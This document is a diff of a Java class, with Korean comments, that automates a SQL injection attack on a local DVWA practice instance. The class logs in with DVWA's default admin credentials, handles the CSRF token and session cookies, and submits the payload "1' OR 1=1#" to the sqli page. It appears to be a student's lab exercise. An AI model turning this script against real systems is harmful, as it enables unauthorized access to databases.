@@ -7,20 +7,22 @@ import java.util.*;
 import java.util.regex.*;
 
 public class SQLInjectionTrial {
-    private static final String BASE_URL = "http://192.168.219.105/DVWA";
+    private static final String BASE_URL = "http://192.168.219.104/DVWA";
     private static final String LOGIN_URL = BASE_URL + "/login.php";
     private static final String ATTACK_URL = BASE_URL + "/vulnerabilities/sqli/";
-    private static String sessionCookie = null;
     private static String csrfToken = null;
-    private static HttpURLConnection conn = null;
+    
+    public void run() throws Exception {
+        // 쿠키 매니저 활성화 (자동 쿠키 관리)
+        CookieManager cookieManager = new CookieManager();
+        CookieHandler.setDefault(cookieManager);
 
-    public void run() throws Exception {    	
         // 1️⃣ 로그인 및 세션 유지
         if (!login()) {
             System.out.println("로그인 실패! 공격 중단");
             return;
         }
-        
+
         // 2️⃣ SQL Injection 공격 실행
         String payload = URLEncoder.encode("1' OR 1=1#", StandardCharsets.UTF_8) + "&Submit=Submit#";
         sendAttack(payload);
@@ -38,21 +40,30 @@ public class SQLInjectionTrial {
 
         // 2️⃣ 로그인 요청 보내기
         String loginData = "username=admin&password=password&user_token=" + csrfToken + "&Login=Login";
-        sendRequest(LOGIN_URL, "POST", loginData);
+        String loginResponse = sendRequest(LOGIN_URL, "POST", loginData);
 
-        // 3️⃣ 리디렉션 URL을 확인하여 로그인 성공 여부 판단
-        Map<String, List<String>> headers = conn.getHeaderFields();
-        System.out.println("로그인 헤더: " + headers);
-//        System.out.println(conn.getHeaderField("Set-Cookie"));
-        
-        String redirectUrl = conn.getHeaderField("Location");
-        if (redirectUrl != null && redirectUrl.contains("/index.php")) {
-            System.out.println("로그인 성공! 리디렉션 확인됨.");
+        // ✅ [로그인 후 쿠키 확인]
+        System.out.println("\n🔹 [로그인 후 저장된 쿠키 목록]");
+        printCookies();  // 🔥 로그인 후 쿠키 확인
+
+        // ✅ 응답 본문을 확인하여 로그인 성공 여부 판단
+        if (loginResponse.contains("Welcome to Damn Vulnerable Web Application")) {
+            System.out.println("✅ 로그인 성공!");
             return true;
         }
-        System.out.println("로그인 실패! 리디렉션 없음.");
+
+        System.out.println("❌ 로그인 실패! 응답 본문에 성공 메시지가 없음.");
         return false;
     }
+    
+    // ✅ Set-Cookie 값 가져오기
+    private Map<String, List<String>> getResponseHeaders(String urlString) throws Exception {
+        URL url = new URL(urlString);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        return conn.getHeaderFields();
+    }
+    
+    
 
     // ✅ SQL Injection 공격 요청
     private void sendAttack(String payload) throws Exception {
@@ -61,33 +72,26 @@ public class SQLInjectionTrial {
         System.out.println("공격 응답:" + response);
     }
 
-    // ✅ 요청을 처리하는 공통 메서드 (GET/POST 지원)
+ // ✅ 요청을 처리하는 공통 메서드 (GET/POST 지원)
     private String sendRequest(String urlString, String method, String postData) throws Exception {
         URL url = new URL(urlString);
-        conn = (HttpURLConnection) url.openConnection();
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod(method);
         conn.setRequestProperty("User-Agent", "Mozilla/5.0");
         conn.setRequestProperty("Accept", "text/html");
-        
-        
-        // 🔥 기존 세션 쿠키 유지 (로그인 후 세션을 유지함)
-//        System.out.println("기존 헤더: " + conn.getRequestProperties());
-        System.out.println("쿠키: " + sessionCookie);
-        if (sessionCookie != null) {
-            conn.setRequestProperty("Cookie", sessionCookie);
+
+        // 🔥 현재 저장된 쿠키를 요청 헤더에 추가
+        String cookies = getCookies();
+        if (!cookies.isEmpty()) {
+            conn.setRequestProperty("Cookie", cookies);
         }
-        System.out.println("쿠키 채운 이후 헤더: " + conn.getRequestProperties());
-        
-     // ✅ 여기에서 로그인 요청 헤더 출력 (login.php 요청일 경우)
-        if (urlString.contains("login.php")) {
-            System.out.println("🔹 [로그인 요청] Request Headers:");
-//            conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));
-            conn.getRequestProperties();
-        }
+
+        // 🔹 [요청] 헤더 확인 (연결 전)
+        System.out.println("\n🔹 [요청: " + method + " " + urlString + "] Request Headers (연결 전):");
+        conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));
 
         // 🔥 POST 요청 처리
         if ("POST".equals(method) && postData != null) {
-        	System.out.println("POST 작업");
             conn.setDoOutput(true);
             try (OutputStream os = conn.getOutputStream()) {
                 os.write(postData.getBytes(StandardCharsets.UTF_8));
@@ -103,32 +107,79 @@ public class SQLInjectionTrial {
         }
         in.close();
 
-        // 🔥 로그인 후 쿠키 저장 (기존 세션 갱신)
-        if (urlString.contains("login.php")) {
-            Map<String, List<String>> headerFields = conn.getHeaderFields();
-            System.out.println("현재 헤더: " + headerFields);
-            List<String> cookies = headerFields.get("Set-Cookie");
+        // 🔹 응답 헤더 출력
+        System.out.println("\n🔹 [응답 헤더]");
+        Map<String, List<String>> responseHeaders = conn.getHeaderFields();
+        responseHeaders.forEach((key, value) -> System.out.println(key + ": " + value));
 
-            if (cookies != null) {
-                for (String cookie : cookies) {
-                    if (cookie.startsWith("PHPSESSID")) {  // ✅ 새로운 PHPSESSID 저장
-                        String[] parts = cookie.split(";");
-                        sessionCookie = parts[0] + "; security=low";  // ✅ 기존 security=low 유지
-                        System.out.println("새로운 세션 쿠키 저장: " + sessionCookie);
-                        break;
-                    }
-                }
+        // 🔥 Set-Cookie 헤더를 수동으로 저장
+        if (responseHeaders.containsKey("Set-Cookie")) {
+            List<String> setCookies = responseHeaders.get("Set-Cookie");
+            for (String cookie : setCookies) {
+                storeCookie(cookie);
             }
         }
-        
+
         return response.toString();
-        
     }
+
+    // ✅ 쿠키를 직접 저장하는 메서드
+    private void storeCookie(String cookieString) {
+        CookieManager cookieManager = (CookieManager) CookieHandler.getDefault();
+        CookieStore cookieStore = cookieManager.getCookieStore();
+
+        // 🔥 Set-Cookie 값에서 쿠키 이름과 값을 추출하여 수동 저장
+        String[] cookies = cookieString.split(";");
+        for (String cookie : cookies) {
+            String[] parts = cookie.split("=", 2);
+            if (parts.length == 2) {
+                HttpCookie httpCookie = new HttpCookie(parts[0].trim(), parts[1].trim());
+                httpCookie.setDomain("192.168.219.104");  // 🔥 DVWA 서버 도메인 설정
+                httpCookie.setPath("/DVWA/");            // 🔥 DVWA 경로 설정
+                cookieStore.add(URI.create(BASE_URL), httpCookie);
+            }
+        }
+    }
+
+    // ✅ 현재 저장된 쿠키를 문자열로 변환 (요청에 넣을 때 사용)
+    private String getCookies() {
+        CookieManager cookieManager = (CookieManager) CookieHandler.getDefault();
+        CookieStore cookieStore = cookieManager.getCookieStore();
+
+        StringBuilder cookieHeader = new StringBuilder();
+        for (URI uri : cookieStore.getURIs()) {
+            if (!uri.toString().contains("192.168.219.104")) continue; // 🔥 올바른 도메인인지 확인
+
+            for (HttpCookie cookie : cookieStore.get(uri)) {
+                if (cookieHeader.length() > 0) {
+                    cookieHeader.append("; ");
+                }
+                cookieHeader.append(cookie.getName()).append("=").append(cookie.getValue());
+            }
+        }
+        return cookieHeader.toString();
+    }
+
 
     // ✅ CSRF 토큰 추출 메서드
     private String extractCsrfToken(String response) {
         Pattern pattern = Pattern.compile("name='user_token' value='(.*?)'");
         Matcher matcher = pattern.matcher(response);
         return matcher.find() ? matcher.group(1) : null;
+    }
+    
+    // 쿠키 상태 확인
+    private void printCookies() {
+        CookieManager cookieManager = (CookieManager) CookieHandler.getDefault();
+        CookieStore cookieStore = cookieManager.getCookieStore();
+
+        System.out.println("\n🔹 [현재 저장된 쿠키 목록]");
+        for (URI uri : cookieStore.getURIs()) {
+            List<HttpCookie> cookies = cookieStore.get(uri);
+            System.out.println("▶ " + uri);
+            for (HttpCookie cookie : cookies) {
+                System.out.println("   - " + cookie);
+            }
+        }
     }
 }
